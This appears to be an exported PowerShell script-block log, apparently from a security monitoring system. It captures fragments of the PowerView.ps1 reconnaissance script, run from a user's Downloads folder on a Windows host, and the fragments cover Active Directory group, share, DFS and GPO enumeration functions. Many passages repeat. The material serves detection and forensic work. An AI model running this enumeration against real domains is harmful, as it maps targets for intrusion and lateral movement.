$Group = New-Object PSObject                        $Group | Add-Member Noteproperty 'Server' $Server                        $Group | Add-Member Noteproperty 'Group' ($_.name[0])                        $Group | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier $_.objectsid[0],0).Value)                        $Group | Add-Member Noteproperty 'Description' ($_.Description[0])                        $Group                    }                }                else {                    # otherwise we're listing the group members                    $Members = @($([ADSI]""WinNT://$Server/$GroupName"").psbase.Invoke('Members'))                    $Members | ForEach-Object {                        $Member = New-Object PSObject                        $Member | Add-Member Noteproperty 'Server' $Server                        $AdsPath = ($_.GetType().InvokeMember('Adspath', 'GetProperty', $Null, $_, $Null)).Replace('WinNT://', '')                        # try to translate the NT4 domain to a FQDN if possible                        $Name = Convert-NT4toCanonical -ObjectName $AdsPath                        if($Name) {                            $FQDN = $Name.split(""/"")[0]                            $ObjName = $AdsPath.split(""/"")[-1]                            $Name = ""$FQDN/$ObjName""                            $IsDomain = $True                        }                        else {                            $Name = $AdsPath                            $IsDomain = $False                        }                        $Member | Add-Member Noteproperty 'AccountName' $Name                        # translate the binary sid to a string                        $Member | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($_.GetType().InvokeMember('ObjectSID', 'GetProperty', $Null, $_, $Null),0)).Value)                        # if the account is local, check if it's disabled, if it's domain, always print $False                        #   TODO: fix this occasinal error?                        $Member | Add-Member Noteproperty 'Disabled' $( if(-not $IsDomain) { try { $_.GetType().InvokeMember('AccountDisabled', 'GetProperty', $Null, $_, $Null) } catch { 'ERROR' } } else { $False } )                        # check if the member is a group                        $IsGroup = ($_.GetType().InvokeMember('Class', 'GetProperty', $Null, $_, $Null) -eq 'group')                        $Member | Add-Member Noteproperty 'IsGroup' $IsGroup                        $Member | Add-Member Noteproperty 'IsDomain' $IsDomain                        if($IsGroup) {                            $Member | Add-Member Noteproperty 'LastLogin' """"                        }                        else {                            try {                                $Member | Add-Member Noteproperty 'LastLogin' ( $_.GetType().InvokeMember('LastLogin', 'GetProperty', $Null, $_, $Null))                            }                            catch {                                $Member | Add-Member Noteproperty 'LastLogin' """"                            }                        }                        $Member                        # if the result is a group domain object and we're recursing,                        # try to resolve all the group member results                        if($Recurse -and $IsDomain -and $IsGroup) {                            $FQDN = $Name.split(""/"")[0]                            $GroupName = $Name.split(""/"")[1].trim()                            Get-NetGroupMember -GroupName $GroupName -Domain $FQDN -FullData -Recurse | ForEach-Object {                                $Member = New-Object PSObject                                $Member | Add-Member Noteproperty 'Server' ""$FQDN/$($_.GroupName)""                                $MemberDN = $_.distinguishedName                                # extract the FQDN from the Distinguished Name                                $MemberDomain = $MemberDN.subString($MemberDN.IndexOf(""DC="")) -replace 'DC=','' -replace ',','.'                                if ($_.samAccountType -ne ""805306368"") {                                    $MemberIsGroup = $True                                }                                else {                                    $MemberIsGroup = $False                                }                                if ($_.samAccountName) {                                    # forest users have the samAccountName set                                    $MemberName = $_.samAccountName                                }                                else {                                    try {                                        # external trust users have a SID, so convert it                                        try {                                            $MemberName = Convert-SidToName $_.cn                                        }                                        catch {                                            # if there's a problem contacting the domain to resolve the SID                                            $MemberName = $_.cn                                        }                                    }                                    catch {                                        Write-Debug ""Error resolving SID : $_""                                    }                                }                                $Member | Add-Member Noteproperty 'AccountName' ""$MemberDomain/$MemberName""                                $Member | Add-Member Noteproperty 'SID' $_.objectsid                                $Member | Add-Member Noteproperty 'Disabled' $False                                $Member | Add-Member Noteproperty 'IsGroup' $MemberIsGroup                                $Member | Add-Member Noteproperty 'IsDomain' $True                                $Member | Add-Member Noteproperty 'LastLogin' ''                                $Member                            }                        }                    }                }            }            catch {                Write-Warning ""[!] Error: $_""            }        }    }}function Get-NetShare {<#    .SYNOPSIS        This function will execute the NetShareEnum Win32API call to query        a given host for open shares. This is a replacement for        ""net share \\hostname""    .PARAMETER ComputerName        The hostname to query for shares. Also accepts IP addresses.    .OUTPUTS        SHARE_INFO_1 structure. A representation of the SHARE_INFO_1        result structure which includes the name and note for each share.    .EXAMPLE        PS C:\> Get-NetShare        Returns active shares on the local host.    .EXAMPLE        PS C:\> Get-NetShare -ComputerName sqlserver        Returns active shares on the 'sqlserver' host#>    [CmdletBinding()]    param(        [Parameter(ValueFromPipeline=$True)]        [Alias('HostName')]        [String]        $ComputerName = 'localhost'    )    begin {        if ($PSBoundParameters['Debug']) {            $DebugPreference = 'Continue'        }    }    process {        # process multiple host object types from the pipeline        $ComputerName = Get-NameField -Object $ComputerName        # arguments for NetShareEnum        $QueryLevel = 1        $PtrInfo = [IntPtr]::Zero        $EntriesRead = 0        $TotalRead = 0        $ResumeHandle = 0        # get the share information        $Result = $Netapi32::NetShareEnum($ComputerName, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)        # Locate the offset of the initial intPtr        $Offset = $PtrInfo.ToInt64()        Write-Debug ""Get-NetShare result: $Result""        # 0 = success        if (($Result -eq 0) -and ($Offset -gt 0)) {            # Work out how mutch to increment the pointer by finding out the size of the structure            $Increment = $SHARE_INFO_1::GetSize()            # parse all the result structures            for ($i = 0; ($i -lt $EntriesRead); $i++) {                # create a new int ptr at the given offset and cast                #   the pointer as our result structure                $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset                $Info = $NewIntPtr -as $SHARE_INFO_1                # return all the sections of the structure                $Info | Select-Object *                $Offset = $NewIntPtr.ToInt64()                $Offset += $Increment            }            # free up the result buffer            $Null = $Netapi32::NetApiBufferFree($PtrInfo)        }        else        {            switch ($Result) {                (5)           {Write-Debug 'The user does not have access to the requested information.'}                (124)         {Write-Debug 'The value specified for the level parameter is not valid.'}                (87)          {Write-Debug 'The specified parameter is not valid.'}                (234)         {Write-Debug 'More entries are available. Specify a large enough buffer to receive all entries.'}                (8)           {Write-Debug 'Insufficient memory is available.'}                (2312)        {Write-Debug 'A session does not exist with the computer name.'}                (2351)        {Write-Debug 'The computer name is not valid.'}                (2221)        {Write-Debug 'Username not found.'}                (53)          {Write-Debug 'Hostname could not be found'}            }        }    }}function Get-NetLoggedon {<#    .SYNOPSIS        This function will execute the NetWkstaUserEnum Win32API call to query        a given host for actively logged on users.    .PARAMETER ComputerName        The hostnameScriptBlock ID: 1a3d4436-4580-464d-b9fd-fe2a68b82ecaPath: C:\Users\michael.ascot\downloads\PowerView.ps1","-","-","-","esolving SID : $_""                                    }                                }                                $PrivilegeRights | Add-Member Noteproperty $_.Name $Sids                            }                            $Policy | Add-Member Noteproperty 'PrivilegeRights' $PrivilegeRights                        }                        else {                            $Policy | Add-Member Noteproperty $_.Name $_.Value                        }                    }                    $Policy                }                else { $_ }            }        }    }}########################################################## Functions that enumerate a single host, either through# WinNT, WMI, remote registry, or API calls # (with PSReflect).#########################################################function Get-NetLocalGroup {<#    .SYNOPSIS        Gets a list of all current users in a specified local group,        or returns the names of all local groups with -ListGroups.    .PARAMETER ComputerName        The hostname or IP to query for local group users.    .PARAMETER ComputerFile        File of hostnames/IPs to query for local group users.    .PARAMETER GroupName        The local group name to query for users. If not given, it defaults to ""Administrators""    .PARAMETER ListGroups        Switch. List all the local groups instead of their members.        Old Get-NetLocalGroups functionality.    .PARAMETER Recurse        Switch. If the local member member is a domain group, recursively try to resolve its members to get a list of domain users who can access this machine.    .EXAMPLE        PS C:\> Get-NetLocalGroup        Returns the usernames that of members of localgroup ""Administrators"" on the local host.    .EXAMPLE        PS C:\> Get-NetLocalGroup -ComputerName WINDOWSXP        Returns all the local administrator accounts for WINDOWSXP    .EXAMPLE        PS C:\> Get-NetLocalGroup -ComputerName WINDOWS7 -Resurse         Returns all effective local/domain users/groups that can access WINDOWS7 with        local administrative privileges.    .EXAMPLE        PS C:\> Get-NetLocalGroup -ComputerName WINDOWS7 -ListGroups        Returns all local groups on the WINDOWS7 host.    .LINK        http://stackoverflow.com/questions/21288220/get-all-local-members-and-groups-displayed-together        http://msdn.microsoft.com/en-us/library/aa772211(VS.85).aspx#>    [CmdletBinding()]    param(        [Parameter(ValueFromPipeline=$True)]        [Alias('HostName')]        [String]        $ComputerName = 'localhost',        [ValidateScript({Test-Path -Path $_ })]        [Alias('HostList')]        [String]        $ComputerFile,        [String]        $GroupName = 'Administrators',        [Switch]        $ListGroups,        [Switch]        $Recurse    )    begin {        if ((-not $ListGroups) -and (-not $GroupName)) {            # resolve the SID for the local admin group - this should usually default to ""Administrators""            $ObjSID = New-Object System.Security.Principal.SecurityIdentifier('S-1-5-32-544')            $Objgroup = $ObjSID.Translate( [System.Security.Principal.NTAccount])            $GroupName = ($Objgroup.Value).Split('\')[1]        }    }    process {        $Servers = @()        # if we have a host list passed, grab it        if($ComputerFile) {            $Servers = Get-Content -Path $ComputerFile        }        else {            # otherwise assume a single host name            $Servers += Get-NameField -Object $ComputerName        }        # query the specified group using the WINNT provider, and        # extract fields as appropriate from the results        ForEach($Server in $Servers) {            try {                if($ListGroups) {                    # if we're listing the group names on a remote server                    $Computer = [ADSI]""WinNT://$Server,computer""                    $Computer.psbase.children | Where-Object { $_.psbase.schemaClassName -eq 'group' } | ForEach-Object {                        $Group = New-Object PSObject                        $Group | Add-Member Noteproperty 'Server' $Server                        $Group | Add-Member Noteproperty 'Group' ($_.name[0])                        $Group | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier $_.objectsid[0],0).Value)                        $Group | Add-Member Noteproperty 'Description' ($_.Description[0])                        $Group                    }                }                else {                    # otherwise we're listing the group members                    $Members = @($([ADSI]""WinNT://$Server/$GroupName"").psbase.Invoke('Members'))                    $Members | ForEach-Object {                        $Member = New-Object PSObject                        $Member | Add-Member Noteproperty 'Server' $Server                        $AdsPath = ($_.GetType().InvokeMember('Adspath', 'GetProperty', $Null, $_, $Null)).Replace('WinNT://', '')                        # try to translate the NT4 domain to a FQDN if possible                        $Name = Convert-NT4toCanonical -ObjectName $AdsPath                        if($Name) {                            $FQDN = $Name.split(""/"")[0]                            $ObjName = $AdsPath.split(""/"")[-1]                            $Name = ""$FQDN/$ObjName""                            $IsDomain = $True                        }                        else {                            $Name = $AdsPath                            $IsDomain = $False                        }                        $Member | Add-Member Noteproperty 'AccountName' $Name                        # translate the binary sid to a string                        $Member | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($_.GetType().InvokeMember('ObjectSID', 'GetProperty', $Null, $_, $Null),0)).Value)                        # if the account is local, check if it's disabled, if it's domain, always print $False                        #   TODO: fix this occasinal error?                        $Member | Add-Member Noteproperty 'Disabled' $( if(-not $IsDomain) { try { $_.GetType().InvokeMember('AccountDisabled', 'GetProperty', $Null, $_, $Null) } catch { 'ERROR' } } else { $False } )                        # check if the member is a group                        $IsGroup = ($_.GetType().InvokeMember('Class', 'GetProperty', $Null, $_, $Null) -eq 'group')                        $Member | Add-Member Noteproperty 'IsGroup' $IsGroup                        $Member | Add-Member Noteproperty 'IsDomain' $IsDomain                        if($IsGroup) {                            $Member | Add-Member Noteproperty 'LastLogin' """"                        }                        else {                            try {                                $Member | Add-Member Noteproperty 'LastLogin' ( $_.GetType().InvokeMember('LastLogin', 'GetProperty', $Null, $_, $Null))                            }                            catch {                                $Member | Add-Member Noteproperty 'LastLogin' """"                            }                        }                        $Member                        # if the result is a group domain object and we're recursing,                        # try to resolve all the group member results                        if($Recurse -and $IsDomain -and $IsGroup) {                            $FQDN = $Name.split(""/"")[0]                            $GroupName = $Name.split(""/"")[1].trim()                            Get-NetGroupMember -GroupName $GroupName -Domain $FQDN -FullData -Recurse | ForEach-Object {                                $Member = New-Object PSObject                                $Member | Add-Member Noteproperty 'Server' ""$FQDN/$($_.GroupName)""                                $MemberDN = $_.distinguishedName                                # extract the FQDN from the Distinguished Name                                $MemberDomain = $MemberDN.subString($MemberDN.IndexOf(""DC="")) -replace 'DC=','' -replace ',','.'                                if ($_.samAccountType -ne ""805306368"") {                                    $MemberIsGroup = $True                                }                                else {                                    $MemberIsGroup = $False                                }                                if ($_.samAccountName) {                                    # forest users have the samAccountName set                                    $MemberName = $_.samAccountName                                }                                else {                                    try {                                        # external trust users have a SID, so convert it                                        try {                                            $MemberName = Convert-SidToName $_.cn                                        }                                        catch {                                            # if there's a problem contacting the domain to resolve the SID                                            $MemberName = $_.cn                                        }                                    }                                    catch {                                        Write-Debug ""Error resolving SID : $_""                                    }                                }                                $Member | Add-Member Noteproperty 'AccountName' ""$MemberDomain/$MemberName""                                $Member | Add-Member Noteproperty 'SID' $_.objectsid                                $Member | Add-Member Noteproperty 'Disabled' $False                                $Member | Add-Member Noteproperty 'IsGroup' $MemberIsGroup                                $Member | Add-Member Noteproperty 'IsDomain' $True                                $Member | Add-Member Noteproperty 'LastLogin' ''                                $Member                            }                        }                    }                }            }            catch {                Write-Warning ""[!] Error: $_""            }        }    }}function Get-NetShare {<#    .SYNOPSIS        This function will execute the NetShareEnum Win32API call to query        a given host for open shares. This is a replacement for        ""net share \\hostname""    .PARAMETER ComputerName        The hostname to query for shares. Also accepts IP addresses.    .OUTPUTS        SHARE_INFO_1 structure. A representation of the SHARE_INFO_1        result structure which includes the name and note for each share.    .EXAMPLE        PS C:\> Get-NetShare        Returns active shares on the local host.    .EXAMPLE        PS C:\> Get-NetShare -ComputerName sqlserver        Returns active shares on the 'sqlserver' host#>    [CmdletBinding()]    param(        [Parameter(ValueFromPipeline=$True)]        [Alias('HostName')]        [String]        $ComputerName = 'localhost'    )    begin {        if ($PSBoundParameters['Debug']) {            $DebugPreference = 'Continue'        }    }    process {        # process multiple host object types from the pipeline        $ComputerName = Get-NameField -Object $ComputerName        # arguments for NetShareEnum        $QueryLevel = 1        $PtrInfo = [IntPtr]::Zero        $EntriesRead = 0        $TotalRead = 0        $ResumeHandle = 0        # get the share information        $Result = $Netapi32::NetShareEnum($ComputerName, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)        # Locate the offset of the initial intPtr        $Offset = $PtrInfo.ToInt64()        Write-Debug ""Get-NetShare result: $Result""        # 0 = success        if (($Result -eq 0) -and ($Offset -gt 0)) {            # Work out how mutch to increment the pointer by finding out the size of the structure            $Increment = $SHARE_INFO_1::GetSize()            # parse all the result structures            for ($i = 0; ($i -lt $EntriesRead); $i++) {                # create a new int ptr at the given offset and cast                #   the pointer as our result structure                $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset                $Info = $NewIntPtr -as $SHARE_INFO_1                # return all the sections of the structure                $Info | Select-Object *                $Offset = $NewIntPtr.ToInt64()                $Offset += $Increment            }            # free up the result buffer            $Null = $Netapi32::NetApiBufferFree($PtrInfo)        }        else        {            switch ($Result) {                (5)           {Write-Debug 'The user does not have access to the requested information.'}                (124)         {Write-Debug 'The value specified for the level parameter is not valid.'}                (87)          {Write-Debug 'The specified parameter is not valid.'}                (234)         {Write-Debug 'More entries are available. Specify a large enough buffer to receive all entries.'}                (8)           {Write-Debug 'Insufficient memory is available.'}                (2312)        {Write-Debug 'A session does not exist with the computer name.'}                (2351)        {Write-Debug 'The computer name is not valid.'}                (2221)        {Write-Debug 'Username not found.'}                (53)          {Write-Debug 'Hostname could not be found'}            }        }    }}function Get-NetLoggedon {<#    .SYNOPSIS        This function will execute the NetWkstaUserEnum Win32API call to query        a given host for actively logged on users.    .PARAMETER ComputerName        The hostname","-","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:39:32.304","3,728"
"DXV3ypsB8mE-0EyZ1X8O","-",logs,"-","-","-",powershell,"-","-","-","-","Execute a Remote Command","-","C:\Users\michael.ascot\downloads\PowerView.ps1","win-3450","Creating Scriptblock text (11 of 26):ame                    $GroupMember | Add-Member Noteproperty 'MemberSid' $MemberSid                    $GroupMember | Add-Member Noteproperty 'IsGroup' $IsGroup                    $GroupMember | Add-Member Noteproperty 'MemberDN' $MemberDN                    $GroupMember                    # if we're doing manual recursion                    if ($Recurse -and !$UseMatchingRule -and $IsGroup -and $MemberName) {                        Get-NetGroupMember -FullData -Domain $MemberDomain -DomainController $DomainController -GroupName $MemberName -Recurse -PageSize $PageSize                    }                }            }        }    }}function Get-NetFileServer {<#    .SYNOPSIS        Returns a list of all file servers extracted from user         homedirectory, scriptpath, and profilepath fields.    .PARAMETER Domain        The domain to query for user file servers, defaults to the current domain.    .PARAMETER DomainController        Domain controller to reflect LDAP queries through.    .PARAMETER TargetUsers        An array of users to query for file servers.    .PARAMETER PageSize        The PageSize to set for the LDAP searcher object.    .EXAMPLE        PS C:\> Get-NetFileServer                Returns active file servers.    .EXAMPLE        PS C:\> Get-NetFileServer -Domain testing                Returns active file servers for the 'testing' domain.#>    [CmdletBinding()]    param(        [String]        $Domain,        [String]        $DomainController,        [String[]]        $TargetUsers,        [ValidateRange(1,10000)]         [Int]        $PageSize = 200    )    function SplitPath {        # short internal helper to split UNC server paths        param([String]$Path)        if ($Path -and ($Path.split(""\\"").Count -ge 3)) {            $Temp = $Path.split(""\\"")[2]            if($Temp -and ($Temp -ne '')) {                $Temp            }        }    }    Get-NetUser -Domain $Domain -DomainController $DomainController -PageSize $PageSize | Where-Object {$_} | Where-Object {            # filter for any target users            if($TargetUsers) {                $TargetUsers -Match $_.samAccountName            }            else { $True }         } | Foreach-Object {            # split out every potential file server path            if($_.homedirectory) {                SplitPath($_.homedirectory)            }            if($_.scriptpath) {                SplitPath($_.scriptpath)            }            if($_.profilepath) {                SplitPath($_.profilepath)            }        } | Where-Object {$_} | Sort-Object -Unique}function Get-DFSshare {<#    .SYNOPSIS        Returns a list of all fault-tolerant distributed file        systems for a given domain.    .PARAMETER Version        The version of DFS to query for servers.        1/v1, 2/v2, or all    .PARAMETER Domain        The domain to query for user DFS shares, defaults to the current domain.    .PARAMETER DomainController        Domain controller to reflect LDAP queries through.    .PARAMETER ADSpath        The LDAP source to search through, e.g. ""LDAP://OU=secret,DC=testlab,DC=local""        Useful for OU queries.    .PARAMETER PageSize        The PageSize to set for the LDAP searcher object.    .EXAMPLE        PS C:\> Get-DFSshare                Returns all distributed file system shares for the current domain.    .EXAMPLE        PS C:\> Get-DFSshare -Domain test                Returns all distributed file system shares for the 'test' domain.#>    [CmdletBinding()]    param(        [String]        [ValidateSet(""All"",""V1"",""1"",""V2"",""2"")]        $Version = ""All"",        [String]        $Domain,        [String]        $DomainController,        [String]        $ADSpath,        [ValidateRange(1,10000)]         [Int]        $PageSize = 200    )    function Get-DFSshareV1 {        [CmdletBinding()]        param(            [String]            $Domain,            [String]            $DomainController,            [String]            $ADSpath,            [ValidateRange(1,10000)]             [Int]            $PageSize = 200        )        $DFSsearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize        if($DFSsearcher) {            $DFSshares = @()            $DFSsearcher.filter = ""(&(objectClass=fTDfs))""            try {                $DFSSearcher.FindAll() | Where-Object {$_} | ForEach-Object {                    $Properties = $_.Properties                    $RemoteNames = $Properties.remoteservername                    $DFSshares += $RemoteNames | ForEach-Object {                        try {                            if ( $_.Contains('\') ) {                                New-Object -TypeName PSObject -Property @{'Name'=$Properties.name[0];'RemoteServerName'=$_.split(""\"")[2]}                            }                        }                        catch {                            Write-Debug ""Error in parsing DFS share : $_""                        }                    }                }            }            catch {                Write-Warning ""Get-DFSshareV2 error : $_""            }            $DFSshares | Sort-Object -Property ""RemoteServerName""        }    }    function Get-DFSshareV2 {        [CmdletBinding()]        param(            [String]            $Domain,            [String]            $DomainController,            [String]            $ADSpath,            [ValidateRange(1,10000)]             [Int]            $PageSize = 200        )        $DFSsearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize        if($DFSsearcher) {            $DFSshares = @()            $DFSsearcher.filter = ""(&(objectClass=msDFS-Linkv2))""            $DFSSearcher.PropertiesToLoad.AddRange(('msdfs-linkpathv2','msDFS-TargetListv2'))            try {                $DFSSearcher.FindAll() | Where-Object {$_} | ForEach-Object {                    $Properties = $_.Properties                    $target_list = $Properties.'msdfs-targetlistv2'[0]                    $xml = [xml][System.Text.Encoding]::Unicode.GetString($target_list[2..($target_list.Length-1)])                    $DFSshares += $xml.targets.ChildNodes | ForEach-Object {                        try {                            $Target = $_.InnerText                            if ( $Target.Contains('\') ) {                                $DFSroot = $Target.split(""\"")[3]                                $ShareName = $Properties.'msdfs-linkpathv2'[0]                                New-Object -TypeName PSObject -Property @{'Name'=""$DFSroot$ShareName"";'RemoteServerName'=$Target.split(""\"")[2]}                            }                        }                        catch {                            Write-Debug ""Error in parsing target : $_""                        }                    }                }            }            catch {                Write-Warning ""Get-DFSshareV2 error : $_""            }            $DFSshares | Sort-Object -Unique -Property ""RemoteServerName""        }    }    $DFSshares = @()        if ( ($Version -eq ""all"") -or ($Version.endsWith(""1"")) ) {        $DFSshares += Get-DFSshareV1 -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize    }    if ( ($Version -eq ""all"") -or ($Version.endsWith(""2"")) ) {        $DFSshares += Get-DFSshareV2 -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize    }    $DFSshares | Sort-Object -Property ""RemoteServerName""}########################################################## GPO related functions.#########################################################function Get-GptTmpl {<#    .SYNOPSIS        Helper to parse a GptTmpl.inf policy file path into a custom object.    .PARAMETER GptTmplPath        The GptTmpl.inf file path name to parse.     .PARAMETER UsePSDrive        Switch. Mount the target GptTmpl folder path as a temporary PSDrive.    .EXAMPLE        PS C:\> Get-GptTmpl -GptTmplPath ""\\dev.testlab.local\sysvol\dev.testlab.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf""        Parse the default domain policy .inf for dev.testlab.local#>    [CmdletBinding()]    Param (        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]        [String]        $GptTmplPath,        [Switch]        $UsePSDrive    )    begin {        if($UsePSDrive) {            # if we're PSDrives, create a temporary mount point            $Parts = $GptTmplPath.split('\')            $FolderPath = $Parts[0..($Parts.length-2)] -join '\'            $FilePath = $Parts[-1]            $RandDrive = (""abcdefghijklmnopqrstuvwxyz"".ToCharArray() | Get-Random -Count 7) -join ''                        Write-Verbose ""Mounting path $GptTmplPath using a temp PSDrive at $RandDrive""            try {                $Null = New-PSDrive -Name $RandDrive -PSProvider FileSystem -Root $FolderPath  -ErrorAction Stop            }            catch {                Write-Debug ""Error mounting path $GptTmplPath : $_""                return $Null            }            # so we can cd/dir the new drive            $GptTmplPath = $RandDrive + "":\"" + $FilePath        }     }    process {        $SectionName = ''        $SectionsTemp = @{}        $SectionsFinal = @{}        try {            if(Test-Path $GptTmplPath) {                Write-Verbose ""Parsing $GptTmplPath""                Get-Content $GptTmplPath -ErrorAction Stop | Foreach-Object {                    if ($_ -match '\[') {                        # this signifies that we're starting a new section                        $SectionName = $_.trim('[]') -replace ' ',''                    }                    elseif($_ -match '=') {                        $Parts = $_.split('=')                        $PropertyName = $Parts[0].trim()                        $PropertyValues = $Parts[1].trim()                        if($PropertyValues -match ',') {                            $PropertyValues = $PropertyValues.split(',')                        }                        if(!$SectionsTemp[$SectionName]) {                            $SectionsTemp.Add($SectionName, @{})                        }                        # add the parsed property into the relevant Section name                        $SectionsTemp[$SectionName].Add( $PropertyName, $PropertyValues )                    }                }                ForEach ($Section in $SectionsTemp.keys) {                    # transform each nested hash table into a custom object                    $SectionsFinal[$Section] = New-Object PSObject -Property $SectionsTemp[$Section]                }                # transform the parent hash table into a custom object                New-Object PSObject -Property $SectionsFinal            }        }        catch {            Write-Debug ""Error parsing $GptTmplPath : $_""        }    }    end {        if($UsePSDrive -and $RandDrive) {            Write-Verbose ""Removing temp PSDrive $RandDrive""            Get-PSDrive -Name $RandDrive -ErrorAction SilentlyContinue | Remove-PSDrive        }    }}function Get-GroupsXML {<#    .SYNOPSIS        Helper to parse a groups.xml file path into a custom object.    .PARAMETER GroupsXMLpath        The groups.xml file path name to parse.     .PARAMETER ResolveSids        Switch. Resolve Sids from a DC policy to object names.    .PARAMETER UsePSDrive        Switch. Mount the target groups.xml folder path as a temporary PSDrive.#>    [CmdletBinding()]    Param (        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]        [String]        $GroupsXMLPath,        [Switch]        $ResolveSids,        [Switch]        $UsePSDrive    )    begin {        if($UsePSDrive) {            # if we're PSDrives, create a temporary mount point            $Parts = $GroupsXMLPath.split('\')            $FolderPath = $Parts[0..($Parts.length-2)] -join '\'            $FilePath = $Parts[-1]            $RandDrive = (""abcdefghijklmnopqrstuvwxyz"".ToCharArray() | Get-Random -Count 7) -join ''                        Write-Verbose ""Mounting path $GroupsXMLPath using a temp PSDrive at $RandDrive""            try {                $Null = New-PSDrive -Name $RandDrive -PSProvider FileSystem -Root $FolderPath  -ErrorAction Stop            }            catch {                Write-Debug ""Error mounting path $GroupsXMLPath : $_""                return $Null            }            # so we can cd/dir the new drive            $GroupsXMLPath = $RandDrive + "":\"" + $FilePath        }     }    process {        # parse the Groups.xml file if it exists         if(Test-Path $GroupsXMLPath) {            [xml] $GroupsXMLcontent = Get-Content $GroupsXMLPath            # process all group properties in the XML            $GroupsXMLcontent | Select-Xml ""//Group"" | Select-Object -ExpandProperty node | ForEach-Object {                $Members = @()                $MemberOf = @()                # extract the localgroup sid for memberof                $LocalSid = $_.Properties.GroupSid                if(!$LocalSid) {                    if($_.Properties.groupName -match 'Administrators') {                        $LocalSid = 'S-1-5-32-544'                    }                    elseif($_.Properties.groupName -match 'Remote Desktop') {                        $LocalSid = 'S-1-5-32-555'                    }                    else {                        $LocalSid = $_.Properties.groupName                    }                }                $MemberOf = @($LocalSid)                $_.Properties.members | ForEach-Object {                  ScriptBlock ID: 1a3d4436-4580-464d-b9fd-fe2a68b82ecaPath: C:\Users\michael.ascot\downloads\PowerView.ps1","-","-","-","ame                    $GroupMember | Add-Member Noteproperty 'MemberSid' $MemberSid                    $GroupMember | Add-Member Noteproperty 'IsGroup' $IsGroup                    $GroupMember | Add-Member Noteproperty 'MemberDN' $MemberDN                    $GroupMember                    # if we're doing manual recursion                    if ($Recurse -and !$UseMatchingRule -and $IsGroup -and $MemberName) {                        Get-NetGroupMember -FullData -Domain $MemberDomain -DomainController $DomainController -GroupName $MemberName -Recurse -PageSize $PageSize                    }                }            }        }    }}function Get-NetFileServer {<#    .SYNOPSIS        Returns a list of all file servers extracted from user         homedirectory, scriptpath, and profilepath fields.    .PARAMETER Domain        The domain to query for user file servers, defaults to the current domain.    .PARAMETER DomainController        Domain controller to reflect LDAP queries through.    .PARAMETER TargetUsers        An array of users to query for file servers.    .PARAMETER PageSize        The PageSize to set for the LDAP searcher object.    .EXAMPLE        PS C:\> Get-NetFileServer                Returns active file servers.    .EXAMPLE        PS C:\> Get-NetFileServer -Domain testing                Returns active file servers for the 'testing' domain.#>    [CmdletBinding()]    param(        [String]        $Domain,        [String]        $DomainController,        [String[]]        $TargetUsers,        [ValidateRange(1,10000)]         [Int]        $PageSize = 200    )    function SplitPath {        # short internal helper to split UNC server paths        param([String]$Path)        if ($Path -and ($Path.split(""\\"").Count -ge 3)) {            $Temp = $Path.split(""\\"")[2]            if($Temp -and ($Temp -ne '')) {                $Temp            }        }    }    Get-NetUser -Domain $Domain -DomainController $DomainController -PageSize $PageSize | Where-Object {$_} | Where-Object {            # filter for any target users            if($TargetUsers) {                $TargetUsers -Match $_.samAccountName            }            else { $True }         } | Foreach-Object {            # split out every potential file server path            if($_.homedirectory) {                SplitPath($_.homedirectory)            }            if($_.scriptpath) {                SplitPath($_.scriptpath)            }            if($_.profilepath) {                SplitPath($_.profilepath)            }        } | Where-Object {$_} | Sort-Object -Unique}function Get-DFSshare {<#    .SYNOPSIS        Returns a list of all fault-tolerant distributed file        systems for a given domain.    .PARAMETER Version        The version of DFS to query for servers.        1/v1, 2/v2, or all    .PARAMETER Domain        The domain to query for user DFS shares, defaults to the current domain.    .PARAMETER DomainController        Domain controller to reflect LDAP queries through.    .PARAMETER ADSpath        The LDAP source to search through, e.g. ""LDAP://OU=secret,DC=testlab,DC=local""        Useful for OU queries.    .PARAMETER PageSize        The PageSize to set for the LDAP searcher object.    .EXAMPLE        PS C:\> Get-DFSshare                Returns all distributed file system shares for the current domain.    .EXAMPLE        PS C:\> Get-DFSshare -Domain test                Returns all distributed file system shares for the 'test' domain.#>    [CmdletBinding()]    param(        [String]        [ValidateSet(""All"",""V1"",""1"",""V2"",""2"")]        $Version = ""All"",        [String]        $Domain,        [String]        $DomainController,        [String]        $ADSpath,        [ValidateRange(1,10000)]         [Int]        $PageSize = 200    )    function Get-DFSshareV1 {        [CmdletBinding()]        param(            [String]            $Domain,            [String]            $DomainController,            [String]            $ADSpath,            [ValidateRange(1,10000)]             [Int]            $PageSize = 200        )        $DFSsearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize        if($DFSsearcher) {            $DFSshares = @()            $DFSsearcher.filter = ""(&(objectClass=fTDfs))""            try {                $DFSSearcher.FindAll() | Where-Object {$_} | ForEach-Object {                    $Properties = $_.Properties                    $RemoteNames = $Properties.remoteservername                    $DFSshares += $RemoteNames | ForEach-Object {                        try {                            if ( $_.Contains('\') ) {                                New-Object -TypeName PSObject -Property @{'Name'=$Properties.name[0];'RemoteServerName'=$_.split(""\"")[2]}                            }                        }                        catch {                            Write-Debug ""Error in parsing DFS share : $_""                        }                    }                }            }            catch {                Write-Warning ""Get-DFSshareV2 error : $_""            }            $DFSshares | Sort-Object -Property ""RemoteServerName""        }    }    function Get-DFSshareV2 {        [CmdletBinding()]        param(            [String]            $Domain,            [String]            $DomainController,            [String]            $ADSpath,            [ValidateRange(1,10000)]             [Int]            $PageSize = 200        )        $DFSsearcher = 